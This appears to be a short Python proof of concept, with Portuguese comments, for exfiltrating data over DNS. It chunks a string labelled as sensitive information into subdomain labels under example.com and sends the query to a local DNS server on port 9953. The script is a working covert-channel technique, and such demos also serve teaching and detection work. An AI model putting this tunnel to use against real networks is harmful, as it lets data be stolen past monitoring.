import socket
from dnslib import DNSRecord, RR, A

# Configurações do servidor DNS
server_ip = '127.0.0.1'
server_port = 9953

def send_data_via_dns(data):
    # Divide os dados em partes menores para serem válidos como nomes de domínio
    # Máximo 63bytes por hostname
    parts = [data[i:i+32] for i in range(0, len(data), 32)]
    
    # Cria um nome de domínio fictício
    domain = '.'.join(parts) + '.example.com'
    
    # Cria a requisição DNS
    q = DNSRecord.question(domain)
    
    # Envia a requisição DNS para o servidor
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Configura o tempo de espera para 5 segundos
    sock.settimeout(5.0)
    sock.sendto(q.pack(), (server_ip, server_port))

    try:
        data = sock.recvfrom(512)
        print(data)

    except socket.timeout:
       print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
    
    finally:
        sock.close()

if __name__ == "__main__":
    data = "Informacao_sensivel_que_precisa_ser_exfiltrada"
    send_data_via_dns(data)
